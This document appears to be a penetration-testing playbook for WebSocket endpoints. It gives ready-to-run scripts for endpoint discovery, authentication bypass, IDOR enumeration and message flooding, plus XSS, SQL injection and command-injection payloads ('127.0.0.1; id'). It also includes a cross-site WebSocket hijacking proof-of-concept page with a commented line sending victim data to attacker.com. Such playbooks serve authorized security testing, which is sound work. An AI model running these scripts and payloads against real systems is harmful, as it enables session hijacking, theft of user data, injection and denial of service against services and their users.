# Playbook: WebSocket Security Testing

## Purpose
Detect and exploit WebSocket implementation flaws including missing
authentication, injection attacks, cross-site WebSocket hijacking (CSWSH),
and denial of service. Covers WS and WSS protocols.
Input: target URL with WebSocket endpoint.

---

## Step 1 — Identify WebSocket Endpoints

```bash
# Check for WebSocket upgrade support
curl -sk -I -H "Upgrade: websocket" \
  -H "Connection: Upgrade" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  -H "Sec-WebSocket-Version: 13" \
  "https://TARGET/" | grep -i "upgrade\|101"

# Common WebSocket paths
PATHS=("/ws" "/websocket" "/socket" "/socket.io/" "/sockjs" "/hub" "/chat" "/stream" "/realtime" "/api/ws" "/graphql")
for path in "${PATHS[@]}"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" \
    -H "Upgrade: websocket" -H "Connection: Upgrade" \
    -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
    -H "Sec-WebSocket-Version: 13" \
    "https://TARGET${path}")
  echo "$path → $CODE"
done

# Search JS files for WebSocket URLs
grep -rioE "wss?://[^\"' ]*" js_files/ 2>/dev/null | sort -u
```

---

## Step 2 — WebSocket Connection Analysis

```bash
# Using websocat (install: cargo install websocat)
# Basic connection
websocat "wss://TARGET/ws" -H "Cookie: session=AUTH_COOKIE"

# With custom headers
websocat "wss://TARGET/ws" \
  -H "Cookie: session=AUTH_COOKIE" \
  -H "Origin: https://TARGET"

# Using python3 websockets
python3 << 'PYEOF'
import asyncio
import websockets

async def connect():
    headers = {"Cookie": "session=AUTH_COOKIE"}
    async with websockets.connect("wss://TARGET/ws", extra_headers=headers) as ws:
        # Send a message
        await ws.send('{"type":"ping"}')
        response = await ws.recv()
        print(f"Received: {response}")

asyncio.run(connect())
PYEOF
```

---

## Step 3 — Authentication Testing

```bash
# Test 1 — Connect without any authentication
websocat "wss://TARGET/ws"
# If connection succeeds → missing authentication

# Test 2 — Connect without session cookie
websocat "wss://TARGET/ws" -H "Origin: https://TARGET"

# Test 3 — Connect with expired/invalid token
websocat "wss://TARGET/ws" -H "Cookie: session=INVALID"

# Test 4 — Send privileged messages as unprivileged user
websocat "wss://TARGET/ws" -H "Cookie: session=REGULAR_USER"
# Try sending: {"action":"admin_get_users"}
# Try sending: {"action":"delete_user","id":1}
```

---

## Step 4 — Cross-Site WebSocket Hijacking (CSWSH)

```bash
# Check Origin header validation
# Connect with attacker origin
websocat "wss://TARGET/ws" -H "Origin: https://evil.com" -H "Cookie: session=AUTH_COOKIE"
# If connection accepted → vulnerable to CSWSH

# PoC HTML for CSWSH
cat << 'HTML'
<html>
<body>
<h2>CSWSH PoC</h2>
<script>
var ws = new WebSocket("wss://TARGET/ws");
ws.onopen = function() {
  // Connection uses victim's cookies automatically
  ws.send(JSON.stringify({action: "get_profile"}));
};
ws.onmessage = function(evt) {
  // Exfiltrate data
  document.body.innerHTML += "<pre>" + evt.data + "</pre>";
  // new Image().src = "https://attacker.com/log?data=" + encodeURIComponent(evt.data);
};
</script>
</body>
</html>
HTML
```

---

## Step 5 — Injection Attacks via WebSocket

```bash
# WebSocket messages may be processed without proper sanitization

# XSS via WebSocket message (if reflected in page)
python3 << 'PYEOF'
import asyncio, websockets

async def test_xss():
    async with websockets.connect("wss://TARGET/ws",
        extra_headers={"Cookie": "session=AUTH_COOKIE"}) as ws:
        payloads = [
            '{"message":"<script>alert(1)</script>"}',
            '{"message":"<img src=x onerror=alert(1)>"}',
        ]
        for p in payloads:
            await ws.send(p)
            resp = await ws.recv()
            print(f"Sent: {p[:50]}")
            print(f"Recv: {resp[:100]}")

asyncio.run(test_xss())
PYEOF

# SQLi via WebSocket
python3 << 'PYEOF'
import asyncio, websockets

async def test_sqli():
    async with websockets.connect("wss://TARGET/ws",
        extra_headers={"Cookie": "session=AUTH_COOKIE"}) as ws:
        payloads = [
            '{"action":"search","query":"test\' OR 1=1--"}',
            '{"action":"search","query":"test\' UNION SELECT NULL,NULL--"}',
            '{"action":"get_user","id":"1 OR 1=1"}',
        ]
        for p in payloads:
            await ws.send(p)
            resp = await ws.recv()
            print(f"Sent: {p}")
            print(f"Recv: {resp[:200]}\n")

asyncio.run(test_sqli())
PYEOF

# Command injection
# {"action":"ping","host":"127.0.0.1; id"}
```

---

## Step 6 — IDOR via WebSocket

```bash
python3 << 'PYEOF'
import asyncio, websockets

async def test_idor():
    async with websockets.connect("wss://TARGET/ws",
        extra_headers={"Cookie": "session=USER_A_COOKIE"}) as ws:
        # Try to access other users' data
        for user_id in range(1, 20):
            await ws.send(f'{{"action":"get_profile","user_id":{user_id}}}')
            resp = await ws.recv()
            if "error" not in resp.lower():
                print(f"[IDOR] user_id={user_id}: {resp[:100]}")

asyncio.run(test_idor())
PYEOF
```

---

## Step 7 — Rate Limiting and DoS

```bash
# Message flooding
python3 << 'PYEOF'
import asyncio, websockets, time

async def flood():
    async with websockets.connect("wss://TARGET/ws",
        extra_headers={"Cookie": "session=AUTH_COOKIE"}) as ws:
        start = time.time()
        for i in range(1000):
            await ws.send(f'{{"action":"search","query":"test{i}"}}')
        elapsed = time.time() - start
        print(f"Sent 1000 messages in {elapsed:.2f}s")
        print("If no rate limit or disconnection → vulnerable to DoS")

asyncio.run(flood())
PYEOF

# Large message test
python3 << 'PYEOF'
import asyncio, websockets

async def large_msg():
    async with websockets.connect("wss://TARGET/ws",
        extra_headers={"Cookie": "session=AUTH_COOKIE"}) as ws:
        # Send increasingly large messages
        for size in [1024, 10240, 102400, 1048576]:
            payload = '{"data":"' + "A" * size + '"}'
            try:
                await ws.send(payload)
                resp = await ws.recv()
                print(f"Size {size}: accepted")
            except Exception as e:
                print(f"Size {size}: rejected ({e})")
                break

asyncio.run(large_msg())
PYEOF
```

---

## Output

```
ENDPOINT      : wss://TARGET/ws
FINDING       : No Origin header validation — CSWSH possible
STEPS         :
  1. Connected with Origin: https://evil.com — accepted
  2. Sent get_profile message — received victim's data
  3. No authentication required on WebSocket (cookie-only)
SEVERITY      : HIGH — cross-site data theft via WebSocket
IMPACT        : Attacker page can hijack victim's WS session,
                read messages, and perform actions on their behalf
EVIDENCE      : [CSWSH PoC HTML + captured profile data]
```

---

## Tools Reference

```bash
# websocat
cargo install websocat

# wscat (Node.js)
npm install -g wscat
wscat -c "wss://TARGET/ws" -H "Cookie: session=AUTH"

# Burp Suite — WebSocket history tab
# Intercept and modify WS messages in real-time
```
